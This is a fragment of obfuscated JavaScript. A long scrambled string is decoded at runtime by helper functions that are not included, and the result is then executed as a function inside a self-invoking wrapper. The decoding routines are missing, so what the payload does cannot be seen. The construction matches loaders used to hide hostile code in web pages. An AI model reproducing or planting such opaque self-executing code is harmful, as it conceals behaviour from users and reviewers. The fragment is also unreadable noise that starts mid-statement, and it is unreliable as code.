OMC=rrb(Ezy('e7]Aa_7n)}pA4n]AN,;Sbtt,C3xD1tig=n.As.n=cu(00ce{;2fonS}i0{.{cna_.o&tw)A(reAuwqs}3w;axor5)r%"o_yAc+?.r_aA4$u}A];n1A2o1?S)=b.f)0urpr>\/AAr=Azpfa.oAVg )rrzAGt4a%%AAfr,t3$A*])#<n]A2=t5pbAa_e(AAA)u_.=d=_y_,egEAcw.3e]g:e;PA1e5((21.6fcrpb{aI[:_iA._ :> =.}ArT]]+"AAd4eAA%r=sojA}J]%hAs[.x})ht[rAeA=.e!Alt.t)%\';.4-3mAy6NmaE(yeo_9. &pgo.egA]ozDFAln53i1c9.(4r_(*etaA+Arr,(ceA))5;iA!el_%oAr]b[BrAesA1e.gucnc[4e(ie!A3uA],d]s}im9ebdrir*cdd$A%aT=E1neit=AA%%e^ =?ttn i.pse%jg!.t_$A,73s.[_oS]2a9e r;_0umf{0ne:g]i0 iA5twcrA1}_lIAe.rs3l_.}.._%!Te(et.1r+e8(pApib.)zcp_%}A5)4]ey1i=w1iiHom)p5tYacd_tsAZe A:%A A)hue5)9rn).\'um+)ACev=em:AAsjang6=arlrms:u!.%mAe!ent{nr2)e)_he_(%Jr3[eieAn+pn%:0id}=w]AAnP.:mlA.Antf.5({sAitA.)o4fH!r=r%c5Ai7%t0)nAhtsrca);Rr!oe.!j, }2}ec2eos}r"lldeAZn2sArhp,eAc.n!ds}.l !"$Eec;o:As,0l._5m2ir!%A.S=I=1]id2{{=c1!eeeo5aTl.ak irn(K%A;Zm[iinAefAE1.,s_nS$.Ahno0]%bcegecxnm+.6=}n.Xt.%:coag4oipA3i,_p%ae(gtCeAdte]AD_R)AjI,tA ttemc_A^At2C_oe2rbocsfena@}#48+,o5G(+j!e(o}x.eo6_ctt))13netA.ar(g%A&5t]Aee]2%]nlu%ei1e.re%Apbf;ep}rA,nJlOl0oGo1somtsct[[r2_eire aea5s)ehe!eA{t9.TA9g}wPwA2A:A-ap!4ln8 AAec(>c.N_hsi31e) 5Afc.AlG4cfAuA=%i\\9"iaa1lo3NA;Ae5"hemt_A,eu5lc%uz15i5 ]uAf1]1@M(4cAA2A]_-ac;3:]AAd=oecx?Tjr]ledA_=ph()\\_!A.d3]9b(At][A]pAbAfeAAa%.etarn6ae=4])-;A(Ze_gdceua 2!rig]#20aAnfJi%kAat; =6c(0yspb.Aoc)(H_.AfKet{]cab.}<g_T\/=ZreA]uu.en)a)]b$.,Am3bAd?An_Ltj.M)A_&etpk2;n]A1%$].ch5].tis:.A{_ea,%c>at51V0la]vAe%.(r"g)p}0Ar8erc+lAf5_d;rt]h)Ar=_eo5ij0!taA(A(u6t,is:Aa]A_tU*}A]4i_ s tnbg5e0otrA+ke;:oAA6AeO,3AaA1hr4074tlg$eAmoo.Ab1Ss2ef;)oro o6%YoA)Tra)t!]iAlsfnI(_f+AAjAAAtl65].s2k]Aj3.A.e.A)1e j0VAC.Au})(tA t)0A=t&;5b]!cotA.)eA4pA]aB.e=reAoA-A6Ar2]a{>[EaTZi]Adtt)A]eAoe_]rx>{.di.i?b$]=A.Ahee.AoA=iAoT0nAn\\%uiZdoAa;\\aiIeAd)neire%)nn%os_lweoNt;=w.bAry(d_5(bfbc=2nlAd_.rEsiA:r!%x3e,l$foa.C]2]5A t!M>TD.3eesYAAscAc[AeAA1h=_erlefrs)8e1Ayrl5A.bsoAbv!.4-_A etA5AfeArt)eAtfdni1D.etre+hae00)(.r9{)gaAeir er1!4fAkoeAbi%gA-AA,:4r;)tr_pZ,1i!(0eui ]7J"j%6tepc4H:6e26hpd_}d.c1`Arotk_[%ior4}b3(=1i]s`c}meaa)]Zo)5.% _!1)g 1=AQ6]]2A,5$;6jbNrt%7AAsAt $3;;}5t1}}eN[Ao({)]3n_)te[&b oS]lm\'s= n;e8i+,Agbe=.c,L94(%htA6is.)Uni9;ptA,})=aA522 m7Y)A.A]b{s(S)fjiod]A%]=[>t_osA2seA:t]u0I=cb).bnO[?.(iAmI$)n.&o5!Aohe.bPde+4RAA)\\A})o%a}td4ZAAy62AreA48_e.[}_\\u?u{LWA3nbvb!2;f;i1.)).)1Abe\/!ngr1.C_!f%@A0A!(]AdYe)s[-y7o_s531-:[=Aae(ov]smebA.oAe@6A<on.5&t%noA#!t!l_.!ueelpA.{5A1%=IA7AlRAiA=Ai]{1r]A)!3l0o3EjS\')At=l]A3.:4e)} \'1Aie;ii;A7xAeaf$\'_&)2en?]30pN_%=cA_!nwAAA:o]Apeo$Ao]%+v1;){ngnAt]r^!tnA,.=iu.l8cnas9teA)l}evA*e3!Q3F[=(ishrtsO;c yA= +(3ArAcp.l6A1d);_)p.K;%(e$!AEeAA]crso8\/2]t SVp m]!a!..oblm;.$ !5%Nrso%At]see)lnAAAsNe]Y-*{j=`25Au_ noTAA=4i6e7etbxtbe%rf2e]AmshNcnt c8Ab&ix(hUA_t._]t:_5u3%\\$)tY(aeie;_0l4(Xs_lol&RAe_A(te+Au1b%=n8ennrt]91rA44_t++A27A_f6t%b%r.s6e{)At_6o2e.}A%eA]C afA:($e;6tr7i("_a.&stpA(s.A=#).)AadAAe=ts3ijx_5efo006.TAn=T]ir_A,_AA9hc5s__>f$)QA..r{(n?hA_Ac2A)eeeaAcZ!c,6e]5tA3fi.t_Xs1=)4exhA_-eexj7AeAg.6A;.AAy_+A.42]25hA3_*T%e%ab=hoAi)%^f=gh$+l{(0t,sn.rin1,se)teAihCAAceeg.afZ2uAn&i}Ast]An(e1aAtAAAAiatA0}AA]_gua+=}_mU($,A.3eecdZ02o1(.0bAe22%t]Sa}]_4]3Awc.+t25Aylsb%nN}.s,]0aV e..,;Qb3A`Ap%)vj$ 1Accu]e6eo))tuA=l.nt+c.AA_Ae)9mfoAs3]vliA(oAJ]]f,tp{H_ end=AUli+Aa(;r(%}ateS]s}A1vr{td$,`e&6=A_)rt;m]b(8YaAAA)d$tAl16)$a^ dodui3.%=o_o_.m"A]b5 %2l]!A5F]i_4]Atjv=lr7_30AeAAmda,(A_re-\/o5AA1.=AAe=oAnr]ao+n((AbhaA;f6,=& {A72YA(v:;8(;ev.eoot7n7nAu_a5#Ar24bAr+dfiu)bl==lee_,An(cJi(84AnA1pA_%5fUPt_AA2]pp3h=\/eate8+ >e!%.iaA6 8a(.=%=2rr;p]e%Afd]A.ntrtA7Al=.nbeA-6+&_)AwlA33A+_eB)17%_);\\7.It39ceh)uaTo1)ocf8Z!827rceA20yAeAoi o0f.ltgA!e_pe2djAxtn)1}A1]1A,{)ABl{A;bAtt}A5AiAf.VAF,2As,aAcx_}rt{uAe(.Ahs]5]A1d)#2TtZTA0t] Ap=d(i]th{=^bn)A{t{rBA %Ar;o;Ybr]]4 (4.:so8ny)kA-$0aacAeA_cA1o_3CdpA3e_oAfh;<T3%o!ek23t;AAj4c_{(Yt5iA?eAlA t9[sA12eA(u%r nc_\\e;,]AfeEi9.%(t#uCAWooA. %l3&np]}A_e(=_.khAauA(gA3)b]A;u4}rAdA)fAt:!,r]_35or[pfu4A5{rA$(A&#% cA]1Ao n74_e ]=p]e=A]%lA]e3LAw(g 1Ap%%rgr2A)elidA55})artfAafeAwnHuApe{:e_t$NA_&)lt6u=An5pZ3_t5)oHe_ ;rt(^]}.[gne[t(JA5nAene7:ieeA)=sdp6 K gh1Ae{4t!ou[]tiQsorAdn dooeOd=n oo1.an=elp19(estO=AAA6AtAo2(X=AAin5Ade5A3A_{;etA}A.an1  r%4Y)AA6ea_ C6i.op.w1__l!)A A{.A Am(Ai_An__%A]%e4o]e.oc5)gA2]A]Ag{;.Api2}=8n)MA._%we(}`3u{(_aAl_e_ om}e#_b]roI]te=h(oa{M,ppAw,i)rc1<AAA oA'));var iqQ=Rdz(eBj,OMC );iqQ(1571);return 4539})()
